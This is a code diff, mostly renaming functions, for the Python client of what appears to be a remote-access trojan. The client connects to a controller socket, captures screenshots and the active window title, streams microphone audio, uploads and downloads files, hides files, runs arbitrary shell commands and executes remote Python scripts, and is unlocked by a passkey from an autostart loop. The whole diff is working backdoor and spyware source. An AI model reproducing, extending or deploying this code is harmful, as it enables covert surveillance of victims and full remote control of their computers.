@@ -12,7 +12,6 @@ import platform
 import zlib
 import pyaudio
 
-
 # INIT VARIABLES
 HOST = '127.0.0.1'
 PORT = 4434
@@ -72,43 +71,43 @@ bmp_info = BITMAPINFO()
 
 
 # Get info about app & pc
-def PCINFO():
+def pc_info():
     return str({
         'ostype': __ostype__,
         'os': __os__,
         'protection': str(active),
         'user': __user__,
         'version': __version__,
-        'activewindowtitle': GetWindowTitle(),
+        'activewindowtitle': get_window_title(),
     })
 
 
-def SCREENSHOT():
+def screenshot():
     return str({
-        'screenshot': ScreenBITS(),
+        'screenshot': screen_bits(),
         'width': str(bmp_info.bmiHeader.biWidth),
         'height': str(bmp_info.bmiHeader.biHeight),
     })
 
 
-def Send(sock, data, mode, splitter='%:::%', end="[ENDOFMESSAGE]"):
-    msg = (data + end).encode('utf-8')
+def send(sock, _data, mode, splitter='%:::%', end="[ENDOFMESSAGE]"):
+    msg = (_data + end).encode('utf-8')
     size = sys.getsizeof(msg)
     msg = mode + splitter + msg
     sock.sendall(str(size) + '%:::%' + msg)
 
 
-def Receive(sock, splitter='%:::%', end="[ENDOFMESSAGE]"):
-    recievedData = ""
+def receive(sock, splitter='%:::%', end="[ENDOFMESSAGE]"):
+    received_data = ""
     l = sock.recv(1024)
     while l:
-        recievedData = recievedData + l
-        if recievedData.endswith(end):
+        received_data = received_data + l
+        if received_data.endswith(end):
             break
         else:
             l = sock.recv(1024)
-    if recievedData.count(splitter):
-        _type, message = recievedData.split(splitter)
+    if received_data.count(splitter):
+        _type, message = received_data.split(splitter)
         return _type, message[:-len(end)].decode('utf-8')
     else:
         return 'info', ''
@@ -133,45 +132,46 @@ def upload(sock, filename, end="[ENDOFMESSAGE]"):
 
 
 def download(sock, filename, end="[ENDOFMESSAGE]"):
-    recievedData = ''
+    received_data = ''
     try:
         l = sock.recv(1024)
         while l:
-            recievedData += l
-            if recievedData.endswith(end):
+            received_data += l
+            if received_data.endswith(end):
                 break
             else:
                 l = sock.recv(1024)
         with open(filename, 'wb') as _file:
-            _file.write(recievedData[:-len(end)])
+            _file.write(received_data[:-len(end)])
         return 'downloadDone'
     except:
         return 'downloadError'
 
-def getDefaultInputDevice():
+
+def get_default_input_device():
     p = pyaudio.PyAudio()
     device_name = p.get_default_input_device_info()
     return device_name['name']
 
-def ScreenBITS():
-    hDesktopDC = User32.GetWindowDC(hDesktopWnd)
-    hCaptureDC = Gdi32.CreateCompatibleDC(hDesktopDC)
-    hCaptureBitmap = Gdi32.CreateCompatibleBitmap(hDesktopDC, width, height)
-    Gdi32.SelectObject(hCaptureDC, hCaptureBitmap)
-    Gdi32.BitBlt(hCaptureDC, 0, 0, width, height, hDesktopDC, left, top, 0x00CC0020)
+
+def screen_bits():
+    h_desktop_dc = User32.GetWindowDC(hDesktopWnd)
+    h_capture_dc = Gdi32.CreateCompatibleDC(h_desktop_dc)
+    h_capture_bitmap = Gdi32.CreateCompatibleBitmap(h_desktop_dc, width, height)
+    Gdi32.SelectObject(h_capture_dc, h_capture_bitmap)
+    Gdi32.BitBlt(h_capture_dc, 0, 0, width, height, h_desktop_dc, left, top, 0x00CC0020)
     hdc = User32.GetDC(None)
     bmp_info.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
-    DIB_RGB_COLORS = 0
-    Gdi32.GetDIBits(hdc, hCaptureBitmap, 0, 0, None, ctypes.byref(bmp_info), DIB_RGB_COLORS)
+    dib_rgb_colors = 0
+    Gdi32.GetDIBits(hdc, h_capture_bitmap, 0, 0, None, ctypes.byref(bmp_info), dib_rgb_colors)
     bmp_info.bmiHeader.biSizeimage = int(
-        bmp_info.bmiHeader.biWidth * abs(bmp_info.bmiHeader.biHeight) * (bmp_info.bmiHeader.biBitCount + 7) / 8)
-    pBuf = ctypes.create_unicode_buffer(bmp_info.bmiHeader.biSizeimage)
-    Gdi32.GetBitmapBits(hCaptureBitmap, bmp_info.bmiHeader.biSizeimage, pBuf)
-    return zlib.compress(pBuf)
+            bmp_info.bmiHeader.biWidth * abs(bmp_info.bmiHeader.biHeight) * (bmp_info.bmiHeader.biBitCount + 7) / 8)
+    p_buf = ctypes.create_unicode_buffer(bmp_info.bmiHeader.biSizeimage)
+    Gdi32.GetBitmapBits(h_capture_bitmap, bmp_info.bmiHeader.biSizeimage, p_buf)
+    return zlib.compress(p_buf)
 
 
-def Execute(source):
-    global data
+def execute(source):
     data = ''
     try:
         exec source
@@ -182,7 +182,7 @@ def Execute(source):
         return str(e)
 
 
-def Exec(cmde):
+def exec_(cmde):
     if cmde:
         try:
             execproc = subprocess.Popen(cmde, shell=True,
@@ -213,34 +213,36 @@ def set_content_attribute(filepath):
         Kernel32.SetFileAttributesW(filepath, 2)
 
 
-def GetWindowTitle():
-    GetForegroundWindow = User32.GetForegroundWindow
-    GetWindowTextLength = User32.GetWindowTextLengthW
-    GetWindowText = User32.GetWindowTextW
-    HWND = GetForegroundWindow()
-    length = GetWindowTextLength(HWND)
+def get_window_title():
+    get_foreground_window = User32.GetForegroundWindow
+    get_window_text_length = User32.GetWindowTextLengthW
+    get_window_text = User32.GetWindowTextW
+    hwnd = get_foreground_window()
+    length = get_window_text_length(hwnd)
     buff = ctypes.create_unicode_buffer(length + 1)
-    GetWindowText(HWND, buff, length + 1)
+    get_window_text(hwnd, buff, length + 1)
     return buff.value
 
 
-class childSocket(threading.Thread):
+class ChildSocket(threading.Thread):
     def __init__(self, id, mode):
-        super(childSocket, self).__init__()
+        super(ChildSocket, self).__init__()
 
         self.active = True
         self.id = id
         self.mode = mode
 
-    def run(self):
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    def run(self):
+
         self.socket.connect((HOST, PORT))
 
         while self.active:
             try:
-                mode, data = Receive(self.socket)
+                mode, data = receive(self.socket)
                 if data == 'pcinfo':
-                    stdoutput = PCINFO()
+                    stdoutput = pc_info()
                 elif data.startswith('upload '):
                     try:
                         filename = data.split(' ')[1]
@@ -254,17 +256,17 @@ class childSocket(threading.Thread):
                     except:
                         stdoutput = 'downloadError'
                 elif data.startswith('getDefaultInputDeviceName'):
-                    stdoutput = getDefaultInputDevice()
+                    stdoutput = get_default_input_device()
                 elif data.startswith('startAudio'):
                     try:
-                        audioThread = audioStreaming(self.socket, int(data.split(' ')[-1]))
-                        audioThread.start()
+                        audio_thread = AudioStreaming(self.socket, int(data.split(' ')[-1]))
+                        audio_thread.start()
                         stdoutput = 'audioStarted'
                     except:
                         stdoutput = 'audioError'
                 elif data.startswith('stopAudio'):
                     try:
-                        audioThread.active = False
+                        audio_thread.active = False
                     except:
                         pass
                     stdoutput = 'audioStopped'
@@ -277,7 +279,7 @@ class childSocket(threading.Thread):
                 elif data.startswith(("Activate")):
                     stdoutput = ''
                 elif data.startswith("runscript "):
-                    stdoutput = Execute(data[10:])
+                    stdoutput = execute(data[10:])
                 elif data.startswith("ls"):
                     string = {}
                     try:
@@ -295,15 +297,15 @@ class childSocket(threading.Thread):
                 elif data.startswith('myinfo'):
                     stdoutput = self.mode + ' ' + self.id
                 else:
-                    stdoutput = Exec(data)
-                Send(self.socket, stdoutput, mode)
+                    stdoutput = exec_(data)
+                send(self.socket, stdoutput, mode)
             except socket.error:
                 return
 
 
-class audioStreaming(threading.Thread):
+class AudioStreaming(threading.Thread):
     def __init__(self, sock, rate):
-        super(audioStreaming, self).__init__()
+        super(AudioStreaming, self).__init__()
 
         self.active = True
         self.sock = sock
@@ -331,13 +333,13 @@ class audioStreaming(threading.Thread):
         self.p.terminate()
 
 
-def startChildSocket(id, mode):
-    socketsBank[id] = childSocket(id, mode)
+def start_child_socket(id, mode):
+    socketsBank[id] = ChildSocket(id, mode)
     socketsBank[id].start()
     return id
 
 
-def fromAutostart():
+def from_autostart():
     global active
     global passKey
     while 1:
@@ -352,38 +354,38 @@ def fromAutostart():
 
         while 1:
             try:
-                mode, data = Receive(s)
+                mode, data = receive(s)
                 if data == 'info':
-                    Send(s, PCINFO(), mode)
+                    send(s, pc_info(), mode)
                     continue
                 if data == 'getScreen':
-                    Send(s, SCREENSHOT(), mode)
+                    send(s, screenshot(), mode)
                     continue
                 if data.startswith('startChildSocket'):
-                    Send(s, startChildSocket(str(data.split(' ')[-1]), mode), mode)
+                    send(s, start_child_socket(str(data.split(' ')[-1]), mode), mode)
                     continue
                 if data == passKey:
                     active = True
-                    Send(s, 'iamactive', mode)
+                    send(s, 'iamactive', mode)
                     while active:
-                        mode, data = Receive(s)
+                        mode, data = receive(s)
                         if data == "lock":
                             active = False
                             break
                         if data == 'info':
-                            stdoutput = PCINFO()
+                            stdoutput = pc_info()
                         elif data.startswith('startChildSocket'):
-                            stdoutput = startChildSocket(str(data.split(' ')[-1]), mode)
+                            stdoutput = start_child_socket(str(data.split(' ')[-1]), mode)
                         elif data == 'getScreen':
-                            stdoutput = SCREENSHOT()
+                            stdoutput = screenshot()
                         else:
-                            stdoutput = Exec(data)
-                        Send(s, stdoutput, mode=mode)
+                            stdoutput = exec_(data)
+                        send(s, stdoutput, mode=mode)
                     if data == "terminate":
                         break
                     time.sleep(3)
                 else:
-                    Send(s, 'parent', mode)
+                    send(s, 'parent', mode)
             except socket.error:
                 s.close()
                 active = False
@@ -391,4 +393,4 @@ def fromAutostart():
                 break
 
 
-fromAutostart()
+from_autostart()
